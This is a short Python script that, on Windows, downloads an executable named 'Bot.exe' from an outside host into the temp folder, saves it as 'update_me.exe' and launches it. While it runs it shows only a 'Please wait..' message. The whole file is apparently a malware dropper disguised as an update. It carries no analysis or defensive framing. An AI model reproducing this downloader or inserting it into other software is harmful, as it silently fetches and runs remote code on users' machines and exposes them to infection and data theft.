import os
import wget
import platform

if platform.system() == "Windows":
	update_url = "http://f0393986.xsph.ru/u5m2b9v/Bot.exe"
	update_dir = os.environ["temp"] + "\\update_me.exe"
	if not os.path.exists(update_dir):
		print("Please wait..")
		update_installer = wget.download(update_url, bar = None, out = update_dir)
		os.startfile(update_installer)